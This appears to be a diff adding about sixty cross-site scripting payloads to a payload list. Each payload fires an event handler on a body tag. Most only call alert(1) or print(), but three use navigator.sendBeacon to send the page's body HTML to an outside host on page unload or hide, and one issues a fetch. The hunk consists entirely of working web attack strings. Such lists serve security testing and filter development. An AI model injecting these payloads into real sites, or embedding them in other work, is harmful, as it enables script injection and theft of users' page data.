@@ -964,7 +964,69 @@
 <blockquote onpointerover=alert(1)>XSS</blockquote>
 <blockquote onpointerrawupdate=alert(1)>XSS</blockquote>
 <blockquote onpointerup=alert(1)>XSS</blockquote>
-
+<body draggable="true" ondrag="alert(1)">test</body>
+<body draggable="true" ondragend="alert(1)">test</body>
+<body draggable="true" ondragenter="alert(1)">test</body>
+<body draggable="true" ondragleave="alert(1)">test</body>
+<body draggable="true" ondragstart="alert(1)">test</body>
+<body id=x tabindex=1 onactivate=alert(1)></body>
+<body id=x tabindex=1 onbeforeactivate=alert(1)></body>
+<body id=x tabindex=1 onbeforedeactivate=print()></body><input autofocus>
+<body id=x tabindex=1 ondeactivate=print()></body><input id=y autofocus>
+<body id=x tabindex=1 onfocus=alert(1)></body>
+<body id=x tabindex=1 onfocusin=alert(1)></body>
+<body onafterprint=alert(1)>
+<body onafterscriptexecute=alert(1)><script>1</script>
+<body onbeforecopy="alert(1)" contenteditable>test</body>
+<body onbeforecut="alert(1)" contenteditable>test</body>
+<body onbeforepaste="alert(1)" contenteditable>test</body>
+<body onbeforeprint=console.log(1)>
+<body onbeforescriptexecute=alert(1)><script>1</script>
+<body onbeforeunload=navigator.sendBeacon('//https://ssl.portswigger-labs.net/',document.body.innerHTML)>
+<body onblur=alert(1) id=x><iframe id=x>
+<body onclick="alert(1)">test</body>
+<body oncontextmenu="alert(1)">test</body>
+<body oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<body oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<body ondblclick="alert(1)" autofocus tabindex=1>test</body>
+<body onerror=alert(1) onload=/>
+<body onfocusout=alert(1) id=x><iframe id=x>
+<body onhashchange="print()">
+<body onkeydown="alert(1)" contenteditable>test</body>
+<body onkeypress="alert(1)" contenteditable>test</body>
+<body onkeyup="alert(1)" contenteditable>test</body>
+<body onload=alert(1)>
+<body onmessage=print()>
+<body onmousedown="alert(1)">test</body>
+<body onmouseenter="alert(1)">test</body>
+<body onmouseleave="alert(1)">test</body>
+<body onmousemove="alert(1)">test</body>
+<body onmouseout="alert(1)">test</body>
+<body onmouseover="alert(1)">test</body>
+<body onmouseup="alert(1)">test</body>
+<body onmousewheel=alert(1)>requires scrolling
+<body onpagehide=navigator.sendBeacon('//https://ssl.portswigger-labs.net/',document.body.innerHTML)>
+<body onpageshow=alert(1)>
+<body onpaste="alert(1)" contenteditable>test</body>
+<body onpointerdown=alert(1)>XSS</body>
+<body onpointerenter=alert(1)>XSS</body>
+<body onpointerleave=alert(1)>XSS</body>
+<body onpointermove=alert(1)>XSS</body>
+<body onpointerout=alert(1)>XSS</body>
+<body onpointerover=alert(1)>XSS</body>
+<body onpointerrawupdate=alert(1)>XSS</body>
+<body onpointerup=alert(1)>XSS</body>
+<body onpopstate=print()>
+<body onresize="print()">
+<body onscroll=alert(1)><div style=height:1000px></div><div id=x></div>
+<body onselectionchange=alert(1)>select some text
+<body onselectstart=alert(1)>select some text
+<body ontouchend=alert(1)> 
+<body ontouchmove=alert(1)> 
+<body ontouchstart=alert(1)> 
+<body onunhandledrejection=alert(1)><script>fetch('//xyz')</script>
+<body onunload=navigator.sendBeacon('//https://ssl.portswigger-labs.net/',document.body.innerHTML)>
+<body onwheel=alert(1)>
 <br draggable="true" ondrag="alert(1)">test</br>
 <br draggable="true" ondragend="alert(1)">test</br>
 <br draggable="true" ondragenter="alert(1)">test</br>
